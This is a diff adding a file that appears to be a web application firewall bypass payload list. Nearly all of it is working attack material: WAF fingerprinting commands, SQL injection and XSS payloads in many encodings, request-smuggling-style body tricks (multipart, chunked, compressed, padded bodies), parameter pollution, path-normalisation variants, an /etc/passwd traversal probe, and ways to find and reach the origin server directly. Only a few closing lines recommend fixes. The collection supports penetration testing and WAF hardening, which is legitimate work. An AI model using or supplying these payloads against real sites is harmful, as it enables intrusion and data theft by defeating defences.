@@ -1,0 +1,190 @@
+# WAF and Filter Bypass Payloads
+# Transformation fragments and fixtures. Start with a blocked probe and change one property at a time.
+
+# Fingerprinting (commands and indicators)
+wafw00f https://app.example.test
+nmap --script http-waf-detect,http-waf-fingerprint -p 443 app.example.test
+curl -sI "https://app.example.test/?q=<script>alert(1)</script>"
+curl -sI "https://app.example.test/?q=' OR 1=1--"
+curl -sI "https://app.example.test/../../etc/passwd"
+Server: cloudflare
+Server: AkamaiGHost
+Server: awselb/2.0
+Server: BigIP
+X-Sucuri-ID:
+X-CDN: Imperva
+X-Iinfo:
+X-Amz-Cf-Id:
+CF-RAY:
+x-azure-ref:
+Set-Cookie: visid_incap_
+Set-Cookie: __cf_bm
+Set-Cookie: AWSALB
+Set-Cookie: BIGipServer
+Set-Cookie: citrix_ns_id
+Set-Cookie: ak_bmsc
+
+# URL encoding variants of a blocked character sequence (example payload: ' OR 1=1--)
+%27%20OR%201%3D1--
+%2527%2520OR%25201%253D1--
+%252527%252520OR%2525201%25253D1--
+%u0027%u0020OR%u00201%u003D1--
+%C0%A7%20OR%201=1--
+%EF%BC%87%20OR%201=1--
+%ef%bc%87 OR 1=1--
+
+# Case, comment and whitespace variants
+' oR 1=1--
+' OR/*x*/1=1--
+' OR-- x
+1=1--
+' OR 1=1#
+' OR 1 LIKE 1--
+' OR 2>1--
+' AND 1=1 UNION SELECT NULL--
+
+# HTML and JavaScript encoding variants for XSS filters
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=&#x61;lert(1)>
+<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">
+<svg onload=alert&#40;1&#41;>
+<a href="&#106;avascript:alert(1)">x</a>
+<a href="jav&#x09;ascript:alert(1)">x</a>
+<a href="jav&Tab;ascript:alert(1)">x</a>
+<a href="javascript&colon;alert(1)">x</a>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=top['al'+'ert'](1)>
+<img src=x onerror=window[/al/.source+/ert/.source](1)>
+<img src=x onerror=(alert)(1)>
+<img src=x onerror=[1].map(alert)>
+<img src=x onerror=Function('ale'+'rt(1)')()>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<input autofocus onfocus=alert(1)>
+<x onclick=alert(1)>click</x>
+<math><mi xlink:href="javascript:alert(1)">x</mi></math>
+
+# JSON body variants (the WAF may not decode JSON escapes while the application does)
+{"q":"\u0027 OR 1=1--"}
+{"q":"\u003cscript\u003ealert(1)\u003c/script\u003e"}
+{"q":"\u003Cimg src=x onerror=alert(1)\u003E"}
+{"q":["' OR 1=1--"]}
+{"q":{"$ne":""}}
+{"a":"1","q":"' OR 1=1--"}
+{"q":"' OR 1=1--","q":"safe"}
+{"q":"safe","q":"' OR 1=1--"}
+{"\u0071":"' OR 1=1--"}
+
+# Content-type and body-format switching
+Content-Type: application/json -> Content-Type: application/x-www-form-urlencoded
+Content-Type: application/x-www-form-urlencoded -> Content-Type: application/json
+Content-Type: application/x-www-form-urlencoded -> Content-Type: multipart/form-data; boundary=x
+Content-Type: text/xml
+Content-Type: application/x-www-form-urlencoded; charset=ibm500
+Content-Type: application/x-www-form-urlencoded; charset=utf-7
+Content-Type: application/json; charset=utf-16
+Content-Type: multipart/form-data; boundary=x; charset=utf-7
+Content-Type: multipart/form-data; boundary="x"
+Content-Type: multipart/form-data; boundary=x;boundary=y
+Content-Type: multipart/form-data;boundary=x
+Content-Type : multipart/form-data; boundary=x
+
+# Multipart body variants
+--x\r\nContent-Disposition: form-data; name="q"\r\n\r\n' OR 1=1--\r\n--x--
+--x\r\nContent-Disposition: form-data; name="q"; filename="a.txt"\r\n\r\n' OR 1=1--\r\n--x--
+--x\r\nContent-Disposition: form-data; name=q\r\n\r\n' OR 1=1--\r\n--x--
+--x\r\nContent-Disposition: form-data;name="q"\r\n\r\n' OR 1=1--\r\n--x--
+--x\r\ncontent-disposition: form-data; name="q"\r\n\r\n' OR 1=1--\r\n--x--
+--x\r\nContent-Disposition: form-data; name="q\"\r\n\r\n' OR 1=1--\r\n--x--
+--x\r\nContent-Disposition: form-data; name="q"\r\nContent-Type: text/plain\r\n\r\n' OR 1=1--\r\n--x--
+--x\nContent-Disposition: form-data; name="q"\n\n' OR 1=1--\n--x--
+
+# Chunked transfer-encoding (split a blocked token across chunks; the sizes are hexadecimal)
+Transfer-Encoding: chunked with body 3\r\n' O\r\n9\r\nR 1=1-- \r\n0\r\n\r\n
+Transfer-Encoding: chunked with body 1\r\n'\r\n1\r\n \r\n2\r\nOR\r\n0\r\n\r\n
+Transfer-Encoding: chunked with chunk extensions 4;x=y\r\n' OR\r\n0\r\n\r\n
+Transfer-Encoding:\tchunked
+
+# Content-Encoding (a WAF may not decompress)
+Content-Encoding: gzip with a gzip-compressed form body
+Content-Encoding: deflate with a deflate-compressed form body
+Content-Encoding: br with a brotli-compressed form body
+
+# Oversized or padded bodies (some products inspect only the first N bytes)
+python3 -c "print('a=' + 'x'*8192 + '&q=\' OR 1=1--')"
+python3 -c "print('a=' + 'x'*16384 + '&q=<script>alert(1)</script>')"
+python3 -c "print('{\"pad\":\"' + 'x'*32768 + '\",\"q\":\"\\' OR 1=1--\"}')"
+python3 -c "print('<!--' + 'x'*65536 + '-->')"
+
+# Parameter handling (see HTTP-Parameter-Pollution for the full list)
+?q=1&q=' OR 1=1--
+?q=' OR&q=1=1--
+?q[]=' OR 1=1--
+?Q=' OR 1=1--
+?q=safe&&q=' OR 1=1--
+?q=safe;q=' OR 1=1--
+?q=%27%20OR%201=1--&q=safe
+
+# Header, cookie and path positions (some rule sets cover only the query and body)
+User-Agent: ' OR 1=1--
+Referer: https://app.example.test/?q=' OR 1=1--
+Cookie: q=' OR 1=1--
+X-Forwarded-For: ' OR 1=1--
+X-Api-Version: ' OR 1=1--
+/search/' OR 1=1--
+/search;x=' OR 1=1--
+/search/..;/' OR 1=1--
+/search%2f%27%20OR%201=1--
+
+# Path-normalisation variants (WAF and application normalise differently)
+//admin
+/./admin
+/admin/.
+/admin;x
+/admin;.css
+/%2e%2e/admin
+/..;/admin
+/admin%2f
+/admin%2f%2e%2e%2f
+/admin%20
+/admin%09
+/admin..%2f
+/static/..%2fadmin
+/static/%2e%2e/admin
+
+# HTTP method and protocol variants
+GET /?q=' OR 1=1--
+HEAD /?q=' OR 1=1--
+OPTIONS /?q=' OR 1=1--
+POST /?q=' OR 1=1--
+PUT /?q=' OR 1=1--
+PATCH /?q=' OR 1=1--
+DELETE /?q=' OR 1=1--
+FOO /?q=' OR 1=1--
+GET /?q=' OR 1=1-- HTTP/1.0
+
+# Origin access that skips the WAF (own infrastructure)
+curl -sk --resolve app.example.test:443:203.0.113.10 https://app.example.test/
+curl -sk -H "Host: app.example.test" https://203.0.113.10/
+curl -s http://203.0.113.10:8080/
+dig +short TXT example.test
+dig +short A origin.example.test
+dig +short A direct.example.test
+dig +short A mail.example.test
+dig +short A cpanel.example.test
+dig +short A dev.example.test
+dig +short A staging.example.test
+shodan search ssl.cert.subject.cn:app.example.test
+
+# Rate-based and behavioural rule checks
+# Send the blocked payload at a low request rate and a high rate
+# Rotate User-Agent, Accept-Language and header order
+# Send the request over a fresh connection each time and over a reused connection
+# Send the payload on the first request and on the 10th request of a session
+# Send from an IP in a region that is allow-listed or less strictly filtered
+
+# Fixes to recommend instead of relying on the WAF
+# Validate and encode in the application (parameterised queries, contextual output encoding)
+# Apply a virtual patch for the specific vulnerability class
+# Normalise and decode once, before inspection and before use
+# Block unknown content types and oversized bodies explicitly
+# Restrict direct access to the origin to the WAF's address ranges
